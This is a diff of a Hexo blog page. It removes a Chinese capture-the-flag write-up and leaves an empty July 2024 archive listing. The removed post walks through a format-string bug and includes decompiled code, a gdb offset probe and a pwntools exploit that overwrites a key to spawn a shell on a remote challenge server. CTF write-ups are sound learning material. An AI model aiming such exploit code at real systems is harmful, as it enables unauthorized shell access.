@@ -4,21 +4,17 @@
 
 <head>
     
-    <title>每日一题——数据实时监测 - Hexo</title>
+    <title>Archive：2024/7 - Hexo</title>
     <meta charset="UTF-8">
     <meta name="keywords" content="">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5">
     
     <link rel="shortcut icon" href="/favicon.ico" type="image/x-icon" />
-    <meta name="description" content="每日一题——数据实时监测checksec查看，啥都没开 Arch:     i386-32-little RELRO:    Partial RELRO Stack:    No canary found NX:       NX disabled PIE:      No PIE (0x8048000) RWX:      Has RWX segments  ida查看，发现locker内直接有">
-<meta property="og:type" content="article">
-<meta property="og:title" content="每日一题——数据实时监测">
-<meta property="og:url" content="https://wuxiankwy.github.io/2023/09/18/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98%E2%80%94%E2%80%94%E6%95%B0%E6%8D%AE%E5%AE%9E%E6%97%B6%E7%9B%91%E6%B5%8B/index.html">
+    <meta property="og:type" content="website">
+<meta property="og:title" content="Hexo">
+<meta property="og:url" content="https://wuxiankwy.github.io/archives/2024/07/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="每日一题——数据实时监测checksec查看，啥都没开 Arch:     i386-32-little RELRO:    Partial RELRO Stack:    No canary found NX:       NX disabled PIE:      No PIE (0x8048000) RWX:      Has RWX segments  ida查看，发现locker内直接有">
 <meta property="og:locale" content="en_US">
-<meta property="article:published_time" content="2023-09-18T12:00:00.000Z">
-<meta property="article:modified_time" content="2023-09-18T12:01:07.455Z">
 <meta property="article:author" content="WuXianKwY">
 <meta name="twitter:card" content="summary">
     
@@ -26,13 +22,13 @@
 <link rel="stylesheet" href="/lib/mdui_043tiny/mdui.css">
 
 
-    <link rel="stylesheet" href="/lib/iconfont/iconfont.css?v=1720666321583">
+    <link rel="stylesheet" href="/lib/iconfont/iconfont.css?v=1720666321614">
     
-    <link rel="stylesheet" href="/css/style.css?v=1720666321583">
+    <link rel="stylesheet" href="/css/style.css?v=1720666321614">
 
     
         
-            <link rel="stylesheet" href="/custom.css?v=1720666321583">
+            <link rel="stylesheet" href="/custom.css?v=1720666321614">
         
     
 
@@ -41,7 +37,7 @@
 <script src="/lib/fancybox/fancybox.umd.js" async></script>
 
 
-    <script async src="/js/app.js?v=1720666321583"></script>
+    <script async src="/js/app.js?v=1720666321614"></script>
     
      
 
@@ -92,7 +88,7 @@
             </div>
         </a>
         
-        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/archive" title="文章归档">
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple true" href="/archive" title="文章归档">
             <i class="mdui-list-item-icon nexmoefont icon-container"></i>
             <div class="mdui-list-item-content">
                 文章归档
@@ -325,18 +321,21 @@
     </div>
     <div id="nexmoe-content">
         <div class="nexmoe-primary">
+    <section class="nexmoe-posts">
+    
     <div class="nexmoe-post">
-  <article>
-    
-        <div class="nexmoe-post-cover"> 
-            <img src="https://s3.bmp.ovh/imgs/2023/07/29/c015f7b9d559ce0e.png" alt="每日一题——数据实时监测" loading="lazy">
-            <h1>每日一题——数据实时监测</h1>
-        </div>
-    
-    
-    <div class="nexmoe-post-meta">
+        <a href="/2024/07/11/%E7%88%AC%E8%99%AB%E7%BB%9F%E8%AE%A1%E5%9B%BE%E5%AF%BC%E8%88%AA/">
+            
+                <div class="nexmoe-post-cover mdui-ripple"> 
+                    <img src="https://s3.bmp.ovh/imgs/2023/07/29/c015f7b9d559ce0e.png" alt="" loading="lazy">
+                    <h1></h1>
+                </div>
+            
+        </a>
+
+        <div class="nexmoe-post-meta">
     <div class="nexmoe-rainbow">
-        <a class="nexmoefont icon-calendar-fill">2023年09月18日</a>
+        <a class="nexmoefont icon-calendar-fill">2024年07月11日</a>
         
         
     </div>
@@ -347,68 +346,13 @@
     
 </div>
 
-    <h3 id="每日一题——数据实时监测"><a href="#每日一题——数据实时监测" class="headerlink" title="每日一题——数据实时监测"></a>每日一题——数据实时监测</h3><p>checksec查看，啥都没开</p>
-<pre><code>Arch:     i386-32-little
-RELRO:    Partial RELRO
-Stack:    No canary found
-NX:       NX disabled
-PIE:      No PIE (0x8048000)
-RWX:      Has RWX segments
-</code></pre>
-<p>ida查看，发现locker内直接有shell，需要我们改变key的值，盲猜一手字符串漏洞</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">int locker()</span><br><span class="line">&#123;</span><br><span class="line">  int result; // eax</span><br><span class="line">  char s; // [esp+0h] [ebp-208h]</span><br><span class="line"></span><br><span class="line">  fgets(&amp;s, 512, stdin);</span><br><span class="line">  imagemagic(&amp;s);</span><br><span class="line">  if ( key == 35795746 )</span><br><span class="line">    result = system(&quot;/bin/sh&quot;);</span><br><span class="line">  else</span><br><span class="line">    result = printf(format, &amp;key, key);</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>果然找到了printf在imagemagic()</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl imagemagic(char *format)</span><br><span class="line">&#123;</span><br><span class="line">  return printf(format);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>这里需要用到pwntools的利器fmtstr_payload简化对格式化<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E5%AD%97%E7%AC%A6%E4%B8%B2&spm=1001.2101.3001.7020">字符串</a>漏洞的构造工作.</p>
-<h6 id="fmtstr-payload-offset-writes-numbwritten-0-write-size-‘byte’"><a href="#fmtstr-payload-offset-writes-numbwritten-0-write-size-‘byte’" class="headerlink" title="fmtstr_payload(offset, writes, numbwritten&#x3D;0, write_size&#x3D;‘byte’)"></a>fmtstr_payload(offset, writes, numbwritten&#x3D;0, write_size&#x3D;‘byte’)</h6><ul>
-<li>第一个参数表示格式化字符串的偏移；</li>
-<li>第二个参数表示需要利用%n写入的数据，采用字典形式，我们要将printf的GOT数据改为system函数地址，就写成{printfGOT: systemAddress}；本题是将0804a048处改为0x2223322</li>
-<li>第三个参数表示已经输出的字符个数，这里没有，为0，采用默认值即可；</li>
-<li>第四个参数表示写入方式，是按字节（byte）、按双字节（short）还是按四字节（int），对应着hhn、hn和n，默认值是byte，即按hhn写。</li>
-<li>fmtstr_payload函数返回的就是payload</li>
-</ul>
-<p>gdb运行下查看偏移量</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">AAAA-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p</span><br><span class="line">AAAA-0xf7fd8ff4-0xffffd0f0-0xf7e2a000-0xffffd184-0xf7ffcb80-0xffffd0a8-0x80484e7-0xffffcea0-0x200-0xf7e2a620-0x30e9-0x41414141-0x2d70252d</span><br><span class="line">The location of key is 0804a048, and its value is 00000000,not the 0x02223322. (╯°Д°)╯︵ ┻━┻</span><br><span class="line">[Inferior 1 (process 3710) exited normally]</span><br></pre></td></tr></table></figure>
-
-<h5 id="exp"><a href="#exp" class="headerlink" title="exp:"></a>exp:</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p = remote(&quot;61.147.171.105&quot;,49155)</span><br><span class="line">key_addr = 0x804A048</span><br><span class="line">key = 0x2223322</span><br><span class="line">payload = fmtstr_payload(12,&#123;key_addr:key&#125;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-
-    <p><img src="https://s3.bmp.ovh/imgs/2023/08/25/5d9bf97786040a97.jpg" loading="lazy"></p>
-
-  </article>
-
-  
-      
-    <div class="nexmoe-post-copyright">
-        <strong>Author：</strong>WuXianKwY<br>
-        <strong>Link：</strong><a href="https://wuxiankwy.github.io/2023/09/18/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98%E2%80%94%E2%80%94%E6%95%B0%E6%8D%AE%E5%AE%9E%E6%97%B6%E7%9B%91%E6%B5%8B/" title="https:&#x2F;&#x2F;wuxiankwy.github.io&#x2F;2023&#x2F;09&#x2F;18&#x2F;%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98%E2%80%94%E2%80%94%E6%95%B0%E6%8D%AE%E5%AE%9E%E6%97%B6%E7%9B%91%E6%B5%8B&#x2F;" target="_blank" rel="noopener">https:&#x2F;&#x2F;wuxiankwy.github.io&#x2F;2023&#x2F;09&#x2F;18&#x2F;%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98%E2%80%94%E2%80%94%E6%95%B0%E6%8D%AE%E5%AE%9E%E6%97%B6%E7%9B%91%E6%B5%8B&#x2F;</a><br>
-        
-            <strong>内网映射搭建了个本机我的世界多模组服务器，暑假可以一起来玩ya
-
-        
+        <article>
+            
+        </article>
     </div>
 
+</section>
 
-  
-  
-  <div class="nexmoe-post-meta nexmoe-rainbow">
-   
-    
-</div>
-  
-  
-    <script async src="/js/copy-codeblock.js?v=1720666321550"></script>
-  
-
-  
-      <div class="nexmoe-post-footer">
-          扫码加入QQ群一起玩！
-
-      </div>
-  
-</div>
 </div>
         <div class="nexmoe-post-right">
               <div class="nexmoe-fixed">
@@ -417,13 +361,6 @@ RWX:      Has RWX segments
                       
                         
                           
-                          
-                              <button class="mdui-fab catalog" style="overflow:unset;">
-                                  <i class="nexmoefont icon-i-catalog"></i>
-                                  <div class="nexmoe-toc">
-                                      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98%E2%80%94%E2%80%94%E6%95%B0%E6%8D%AE%E5%AE%9E%E6%97%B6%E7%9B%91%E6%B5%8B"><span class="toc-number">1.</span> <span class="toc-text">每日一题——数据实时监测</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#fmtstr-payload-offset-writes-numbwritten-0-write-size-%E2%80%98byte%E2%80%99"><span class="toc-number">1.0.0.1.</span> <span class="toc-text">fmtstr_payload(offset, writes, numbwritten&#x3D;0, write_size&#x3D;‘byte’)</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#exp"><span class="toc-number">1.0.1.</span> <span class="toc-text">exp:</span></a></li></ol></li></ol></li></ol>
-                                  </div>
-                              </button>
                           
                           
                       
